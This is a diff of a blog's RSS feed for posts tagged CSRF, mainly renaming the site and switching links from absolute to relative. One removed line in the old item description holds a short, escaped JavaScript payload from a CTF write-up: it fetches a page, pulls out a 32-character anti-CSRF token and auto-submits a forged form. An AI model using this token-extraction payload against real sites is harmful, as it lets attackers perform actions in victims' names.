@@ -1,24 +1,36 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>CSRF on Ajdin.io</title>
-    <link>https://ajdin.io/tags/csrf/</link>
-    <description>Recent content in CSRF on Ajdin.io</description>
+    <title>CSRF on Ajdin Trejić</title>
+    
+    
+    
+    <link>/tags/csrf/</link>
+    <description>Recent content in CSRF on Ajdin Trejić</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
+    <language>en-us</language>
     <lastBuildDate>Thu, 07 May 2020 00:43:19 +0200</lastBuildDate>
     
-	<atom:link href="https://ajdin.io/tags/csrf/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/tags/csrf/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
-      <title>CSRF :: Token Extraction</title>
-      <link>https://ajdin.io/posts/csrf-bypass-token-with-xss/</link>
+      <title>CSRF Token Extraction</title>
+      <link>/posts/csrf-bypass-token-with-xss/</link>
       <pubDate>Thu, 07 May 2020 00:43:19 +0200</pubDate>
       
-      <guid>https://ajdin.io/posts/csrf-bypass-token-with-xss/</guid>
-      <description>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
-&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?</description>
+      <guid>/posts/csrf-bypass-token-with-xss/</guid>
+      <description>
+        
+          &lt;img src=&#34;/csrf-bypass-token-with-xss/cover.jpg&#34;/&gt;
+          
+        
+        
+        
+          Extracting tokens from victim using XSS for fun.
+          
+        
+        </description>
     </item>
     
   </channel>
